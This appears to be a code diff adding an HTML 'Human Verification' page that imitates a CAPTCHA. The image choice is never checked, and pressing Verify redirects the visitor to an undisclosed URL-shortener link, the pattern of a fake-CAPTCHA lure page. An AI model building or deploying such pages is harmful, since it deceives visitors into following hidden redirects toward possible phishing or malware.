@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+        }
+        .container {
+            text-align: center;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .captcha-button {
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #4285f4;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .task {
+            display: none;
+            margin-top: 20px;
+        }
+        .task img {
+            max-width: 100%;
+            height: auto;
+            margin: 10px 0;
+        }
+        .task button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #34a853;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Verify that you are not a robot</h2>
+    <button class="captcha-button" onclick="showTask()">Click to check if you are a robot</button>
+
+    <div class="task">
+        <p>Please select the image that contains a car:</p>
+        <img src="https://via.placeholder.com/300x200?text=Image+1" alt="Image 1">
+        <img src="https://via.placeholder.com/300x200?text=Image+2" alt="Image 2">
+        <img src="https://via.placeholder.com/300x200?text=Image+3" alt="Image 3">
+        <button onclick="completeTask()">Verify</button>
+    </div>
+</div>
+
+<script>
+    function showTask() {
+        document.querySelector('.captcha-button').style.display = 'none';
+        document.querySelector('.task').style.display = 'block';
+    }
+
+    function completeTask() {
+        alert("Verification complete. Redirecting...");
+        window.location.href = "https://smrturl.co/218496c";
+    }
+</script>
+
+</body>
+</html>
